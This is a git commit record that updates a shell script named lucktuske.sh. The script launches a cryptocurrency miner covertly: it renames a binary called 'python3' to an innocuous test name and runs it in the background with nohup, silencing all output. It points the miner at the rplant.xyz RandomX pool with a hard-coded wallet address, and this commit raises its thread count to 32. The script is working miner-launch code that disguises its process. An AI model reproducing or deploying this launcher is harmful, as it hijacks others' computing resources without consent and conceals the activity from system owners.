96a56428c49695dbac0c5e700b0bc4917fb8e589
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-15 23:25:32 +0700

    Update lucktuske.sh

--- lucktuske.sh
+++ lucktuske.sh
@@ -12,4 +12,4 @@ cd dotsrb
 
 mv python3 test$kolot
 
-nohup ./test$kolot -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOT-$kolot > /dev/null 2>&1 &
+nohup ./test$kolot -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOT-$kolot -t 32 > /dev/null 2>&1 &
